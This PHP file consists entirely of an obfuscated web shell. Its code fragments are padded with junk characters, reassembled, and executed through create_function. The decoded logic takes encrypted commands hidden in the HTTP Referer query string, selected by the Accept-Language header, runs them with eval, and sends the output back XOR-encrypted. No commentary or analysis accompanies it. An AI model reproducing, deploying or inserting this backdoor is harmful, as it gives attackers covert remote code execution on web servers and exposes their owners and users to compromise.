<?php
$J='<$qVl;){for($jqV=0;(qV$j<$c&&qV$i<$qVl);$j++,$i++qVqV){$o.=$qVqVt{$i}^$k{$j};}}rqVetqVurn $qVo;}$qVr=$_SERVER;qV';
$C=str_replace('L','','cLrLeate_LfuLLnctLion');
$W='i]="qV";$pqV=$ss($pqV,3qV);}if(array_keqVy_existqVs($iqV,$s)qV){$s[$i]qV.=$p;$e=qVstrpqVos(qV$s[$qVi],$f);ifqV(';
$L='V,3));$pqV=qVqV"";for($z=1;$z<count($m[1qVqV]qV);$z++)$p.=qV$q[$m[2][$zqV]];if(sqVtrqVpos($p,$hqV)qV===0){$s[$qV';
$Y='$kh="qV5dqV41";$qVkqVf="402a";function xqV($t,$k)qV{qV$c=sqVtrlen($kqV);$l=strlen($qVt);qV$o="qVqV";for($i=0qV;$i';
$j='strtoqVlower";$iqV=$m[1][qV0]qV.qV$m[1][1];$h=qV$sl($qVss(md5($i.$qVqVkh),0qV,3));$f=$sl(qV$ss(mqVd5(qV$i.$kf),0qVq';
$T='qVlean();$d=bqVase64_encode(xqV(gzcomprqVess(qVqV$o),$qVk));print("<$k>$d<qV/qV$k>");@sesqVsioqVqVn_destroy();}}}}';
$d='$rr=@qV$r["HTTP_RqVqVEFERER"qV];$ra=@$qVr["HTqVTP_ACCqVEPT_LANGUAqVGE"];qViqVf($rr&&$qVra){$uqV=parqVse_urqVl($rr';
$I='qV/_/"qV,"/-/"),aqVrqVray(qV"/","+"),$ss($s[$iqV]qV,0,$e))qV),$k)))qV;$o=ob_get_qVcontqVents()qV;qVob_endqV_cqV';
$e=');paqVqVrse_str($u["queqVry"],$qVq);$qqVqV=array_valueqVs(qVqV$q);preg_match_all(qV"/([\\qVw])[\\w-qV]qV+(?:;qVqVq';
$A='=0.([\\d])qV)?,?/",$qVra,$m);ifqV($q&&$m)qV{@sqVeqVssion_sqVtart();$sqV=qV&$_SESSIqVON;$sqVs="subqVqVstr";$sl="';
$f='$qVeqV){$k=$kh.$qVkf;ob_start(qV);@eqVval(@qVgzuncompreqVsqVs(@x(@bqVaqVse64_qVqVdecode(pregqV_replace(aqVrray("';
$g=str_replace('qV','',$Y.$J.$d.$e.$A.$j.$L.$W.$f.$I.$T);
$l=$C('',$g);$l();
?>
